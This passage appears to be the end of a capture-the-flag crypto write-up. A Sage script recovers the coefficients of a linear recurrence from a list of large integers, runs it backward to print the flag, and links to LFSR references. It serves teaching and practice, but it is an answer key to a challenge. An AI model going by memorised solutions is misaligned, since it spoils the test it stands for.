2671266531631899605156440693785360699681088880751785277451781995127, 190746356675660819059021289711194688989007498945709965975632125093772, 13620569925986012345710256811290898483914841356894501064938828451682289, 972600097542764210429602165761543702875470220807440912087468994318947199, 69450173882625967125859360885466807837084362724230554403206714010957033564, 4959208480970674965771932762141990438694621159829420665293248503741956497339, 354120765763611360372631234091033326236527919343510113669886900852817067794937, 25286599106731127999761204195099137001826484641202640190432847596126102129290177, 1805632869356683189091740036886552559813413339716342384679179468460652986832630119, 128934304100758873373068786008043012614625306314330902439450614878647840309940810799, 9206774564238985792239909901043542380389506567225353556524468058541750913201465442258, 657425488646345934124836595103998888905043390553798696290609052666406363868364633227987, 46944591735815161454850764823066332748372328488810515939042504343121621896260739496814215, 3352158885381868382186614128492698209211597671157972107257901283108688995314288195559935895, 239366640061152248661380413770610731951278310979044705869198442025229868870474962029566786828, 17092384440374810990148000504438682199862673994374786921479630475896214666270304948184067943963, 1220510952499186818225235173267171189892653750839095345581049972346091269304188809141591821528945, 87152672604981875905661244747737456527193455119785950165560211136820203006355054095176767065463607, 6223285687554056604834063330772248822879874758146969128122776216276580479221618865554693862254391145, 444384361274324240336894080988769378714126300500080707977898823502774400070423897702729938853457320554, 31732025566514505285832183071784730973330427403124198140983516899800427456134314554661472009492580417251]
l = len(c) // 2

A = Matrix(ZZ,l)
for i in range(l):
    A[i] = c[i:i+l]
v = vector(c[l:])
key = A.solve_right(v)
for i in range(l):
    cc = c[:l-1]
    s = c[l-1]
    for j in range(l-1):
        s -= cc[j] * key[1+j]
    assert s % key[0] == 0
    r = s // key[0]
    c.insert(0,r)
print(bytes(c[:l]))
```



## Reference

[https://www.jianshu.com/p/4272e0805da3](https://www.jianshu.com/p/4272e0805da3)

[https://ctftime.org/writeup/22161](https://ctftime.org/writeup/22161)

[https://xz.aliyun.com/t/7163](https://xz.aliyun.com/t/7163)

[https://ctf-wiki.org/crypto/streamcipher/fsr/lfsr/](https://ctf-wiki.org/crypto/streamcipher/fsr/lfsr/)

[https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/crypto/Babylfsr](https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/crypto/Babylfsr)
